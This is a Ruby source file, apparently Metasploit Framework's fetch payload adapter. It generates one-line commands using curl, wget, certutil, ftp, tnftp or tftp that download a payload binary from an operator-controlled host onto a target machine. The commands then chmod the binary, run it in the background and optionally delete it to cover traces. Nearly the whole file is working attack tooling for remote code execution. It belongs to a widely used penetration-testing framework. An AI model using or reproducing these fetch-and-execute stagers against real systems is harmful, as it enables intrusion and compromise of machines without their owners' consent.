module Msf::Payload::Adapter::Fetch

  def initialize(*args)
    super
    register_options(
      [
        Msf::OptBool.new('FETCH_DELETE', [true, 'Attempt to delete the binary after execution', false]),
        Msf::OptString.new('FETCH_FILENAME', [ false, 'Name to use on remote system when storing payload; cannot contain spaces.', Rex::Text.rand_text_alpha(rand(8..12))], regex:/^[\S]*$/),
        Msf::OptPort.new('FETCH_SRVPORT', [true, 'Local port to use for serving payload', 8080]),
        Msf::OptAddressRoutable.new('FETCH_SRVHOST', [ true, 'Local IP to use for serving payload', "0.0.0.0"]),
        Msf::OptString.new('FETCH_URIPATH', [ false, 'Local URI to use for serving payload', '']),
        Msf::OptString.new('FETCH_WRITABLE_DIR', [ true, 'Remote writable dir to store payload; cannot contain spaces.', ''], regex:/^[\S]*$/)
      ]
    )
    register_advanced_options(
      [
        Msf::OptAddress.new('FetchListenerBindAddress', [ false, 'The specific IP address to bind to to serve the payload if different from FETCH_SRVHOST']),
        Msf::OptPort.new('FetchListenerBindPort', [false, 'The port to bind to if different from FETCH_SRVPORT']),
        Msf::OptBool.new('FetchHandlerDisable', [true, 'Disable fetch handler', false]),
        Msf::OptString.new('FetchServerName', [true, 'Fetch Server Name', 'Apache'])
      ]
    )
    @delete_resource = true
    @fetch_service = nil
    @myresources = []
    @srvexe = ''
    @remote_destination_win = nil
    @remote_destination_nix = nil
    @windows = nil

  end

  # If no fetch URL is provided, we generate one based off the underlying payload data
  # This is because if we use a randomly-generated URI, the URI generated by venom and
  # Framework will not match.  This way, we can build a payload in venom and a listener
  # in Framework, and if the underlying payload type/host/port are the same, the URI
  # will be, too.
  #
  def default_srvuri
    # If we're in framework, payload is in datastore; msfvenom has it in refname
    payload_name = datastore['payload'] ||= refname
    decoded_uri = payload_name.dup
    # there may be no transport, so leave the connection string off if that's the case
    netloc = ''
    if module_info['ConnectionType'].upcase == 'REVERSE' || module_info['ConnectionType'].upcase == 'TUNNEL'
      netloc << datastore['LHOST'] unless datastore['LHOST'].blank?
      unless datastore['LPORT'].blank?
        if Rex::Socket.is_ipv6?(netloc)
          netloc = "[#{netloc}]:#{datastore['LPORT']}"
        else
          netloc = "#{netloc}:#{datastore['LPORT']}"
        end
      end
    elsif module_info['ConnectionType'].upcase == 'BIND'
      netloc << datastore['LHOST'] unless datastore['LHOST'].blank?
      unless datastore['RPORT'].blank?
        if Rex::Socket.is_ipv6?(netloc)
          netloc = "[#{netloc}]:#{datastore['RPORT']}"
        else
          netloc = "#{netloc}:#{datastore['RPORT']}"
        end
      end
    end
    decoded_uri << ";#{netloc}"
    Base64.urlsafe_encode64(OpenSSL::Digest::MD5.new(decoded_uri).digest, padding: false)
  end

  def download_uri
    "#{srvnetloc}/#{srvuri}"
  end

  def fetch_bindhost
    datastore['FetchListenerBindAddress'].blank? ? srvhost : datastore['FetchListenerBindAddress']
  end

  def fetch_bindport
    datastore['FetchListenerBindPort'].blank? ? srvport : datastore['FetchListenerBindPort']
  end

  def generate(opts = {})
    opts[:arch] ||= module_info['AdaptedArch']
    opts[:code] = super
    @srvexe = generate_payload_exe(opts)
    cmd = generate_fetch_commands
    vprint_status("Command to run on remote host: #{cmd}")
    cmd
  end

  def generate_fetch_commands
    # TODO: Make a check method that determines if we support a platform/server/command combination
    #
    case datastore['FETCH_COMMAND'].upcase
    when 'FTP'
      return _generate_ftp_command
    when 'TNFTP'
      return _generate_tnftp_command
    when 'WGET'
      return _generate_wget_command
    when 'CURL'
      return _generate_curl_command
    when 'TFTP'
      return _generate_tftp_command
    when 'CERTUTIL'
      return _generate_certutil_command
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
  end

  def generate_stage(opts = {})
    opts[:arch] ||= module_info['AdaptedArch']
    super
  end

  def generate_payload_uuid(conf = {})
    conf[:arch] ||= module_info['AdaptedArch']
    conf[:platform] ||= module_info['AdaptedPlatform']
    super
  end

  def handle_connection(conn, opts = {})
    opts[:arch] ||= module_info['AdaptedArch']
    super
  end

  def setup_handler
    super
  end

  def srvhost
    datastore['FETCH_SRVHOST']
  end

  def srvnetloc
    netloc = srvhost
    if Rex::Socket.is_ipv6?(netloc)
      netloc = "[#{netloc}]:#{srvport}"
    else
      netloc = "#{netloc}:#{srvport}"
    end
    netloc
  end

  def srvport
    datastore['FETCH_SRVPORT']
  end

  def srvuri
    return datastore['FETCH_URIPATH'] unless datastore['FETCH_URIPATH'].blank?
    default_srvuri
  end

  def srvname
    datastore['FetchServerName']
  end

  def windows?
    return @windows unless @windows.nil?
    @windows = platform.platforms.first == Msf::Module::Platform::Windows
    @windows
  end

  def _check_tftp_port
    # Most tftp clients do not have configurable ports
    if datastore['FETCH_SRVPORT'] != 69 && datastore['FetchListenerBindPort'].blank?
      print_error('The TFTP client can only connect to port 69; to start the server on a different port use FetchListenerBindPort and redirect the connection.')
      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_SRVPORT must be set to 69 when using the tftp client')
    end
  end

  def _check_tftp_file
    # Older Linux tftp clients do not support saving the file under a different name
    unless datastore['FETCH_WRITABLE_DIR'].blank? && datastore['FETCH_FILENAME'].blank?
      print_error('The Linux TFTP client does not support saving a file under a different name than the URI.')
      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_WRITABLE_DIR and FETCH_FILENAME must be blank when using the tftp client')
    end
  end

  # copied from https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/socket_server.rb
  def _determine_server_comm(ip, srv_comm = datastore['ListenerComm'].to_s)
    comm = nil

    case srv_comm
    when 'local'
      comm = ::Rex::Socket::Comm::Local
    when /\A-?[0-9]+\Z/
      comm = framework.sessions.get(srv_comm.to_i)
      raise(RuntimeError, "Socket Server Comm (Session #{srv_comm}) does not exist") unless comm
      raise(RuntimeError, "Socket Server Comm (Session #{srv_comm}) does not implement Rex::Socket::Comm") unless comm.is_a? ::Rex::Socket::Comm
    when nil, ''
      unless ip.nil?
        comm = Rex::Socket::SwitchBoard.best_comm(ip)
      end
    else
      raise(RuntimeError, "SocketServer Comm '#{srv_comm}' is invalid")
    end

    comm || ::Rex::Socket::Comm::Local
  end

  def _execute_add
    return _execute_win if windows?
    return _execute_nix
  end

  def _execute_win
    cmds = " & start /B #{_remote_destination_win}"
    cmds << " & del #{_remote_destination_win}" if datastore['FETCH_DELETE']
    cmds
  end

  def _execute_nix
    cmds = "; chmod +x #{_remote_destination_nix}"
    cmds << "; #{_remote_destination_nix} &"
    cmds << ";rm -rf #{_remote_destination_nix}" if datastore['FETCH_DELETE']
    cmds
  end

  def _generate_certutil_command
    case fetch_protocol
    when 'HTTP'
      cmd = "certutil -urlcache -f http://#{download_uri} #{_remote_destination}"
    when 'HTTPS'
      # I don't think there is a way to disable cert check in certutil....
      print_error('CERTUTIL binary does not support insecure mode')
      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using CERTUTIL')
      cmd = "certutil -urlcache -f https://#{download_uri} #{_remote_destination}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    cmd + _execute_add
  end

  def _generate_curl_command
    case fetch_protocol
    when 'HTTP'
      cmd = "curl -so #{_remote_destination} http://#{download_uri}"
    when 'HTTPS'
      cmd = "curl -sko #{_remote_destination} https://#{download_uri}"
    when 'TFTP'
      cmd = "curl -so #{_remote_destination} tftp://#{download_uri}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    cmd + _execute_add
  end


  def _generate_ftp_command
    case fetch_protocol
    when 'FTP'
      cmd = "ftp -Vo #{_remote_destination_nix} ftp://#{download_uri}#{_execute_nix}"
    when 'HTTP'
      cmd = "ftp -Vo #{_remote_destination_nix} http://#{download_uri}#{_execute_nix}"
    when 'HTTPS'
      cmd = "ftp -Vo #{_remote_destination_nix} https://#{download_uri}#{_execute_nix}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
  end

  def _generate_tftp_command
    _check_tftp_port
    case fetch_protocol
    when 'TFTP'
      if windows?
        cmd = "tftp -i #{srvhost} GET #{srvuri} #{_remote_destination} #{_execute_win}"
      else
        _check_tftp_file
        cmd = "(echo binary ; echo get #{srvuri} ) | tftp #{srvhost}; chmod +x ./#{srvuri}; ./#{srvuri} &"
      end
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    cmd
  end

  def _generate_tnftp_command
    case fetch_protocol
    when 'FTP'
      cmd = "tnftp -Vo #{_remote_destination_nix} ftp://#{download_uri}#{_execute_nix}"
    when 'HTTP'
      cmd = "tnftp -Vo #{_remote_destination_nix} http://#{download_uri}#{_execute_nix}"
    when 'HTTPS'
      cmd = "tnftp -Vo #{_remote_destination_nix} https://#{download_uri}#{_execute_nix}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
  end

  def _generate_wget_command
    case fetch_protocol
    when 'HTTPS'
      cmd = "wget -qO #{_remote_destination} --no-check-certificate https://#{download_uri}"
    when 'HTTP'
      cmd = "wget -qO #{_remote_destination} http://#{download_uri}"
    else
      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
    end
    cmd + _execute_add
  end

  def _remote_destination
    return _remote_destination_win if windows?
    return _remote_destination_nix
  end

  def _remote_destination_nix
    return @remote_destination_nix unless @remote_destination_nix.nil?
    writable_dir = datastore['FETCH_WRITABLE_DIR']
    writable_dir = '.' if writable_dir.blank?
    writable_dir += '/' unless writable_dir[-1] == '/'
    payload_filename = datastore['FETCH_FILENAME']
    payload_filename = srvuri if payload_filename.blank?
    payload_path = writable_dir + payload_filename
    @remote_destination_nix = payload_path
    @remote_destination_nix
  end

  def _remote_destination_win
    return @remote_destination_win unless @remote_destination_win.nil?
    writable_dir = datastore['FETCH_WRITABLE_DIR']
    writable_dir += '\\' unless writable_dir.blank? || writable_dir[-1] == '\\'
    payload_filename = datastore['FETCH_FILENAME']
    payload_filename = srvuri if payload_filename.blank?
    payload_path = writable_dir + payload_filename
    payload_path = payload_path + '.exe' unless payload_path[-4..-1] == '.exe'
    @remote_destination_win = payload_path
    @remote_destination_win
  end
end
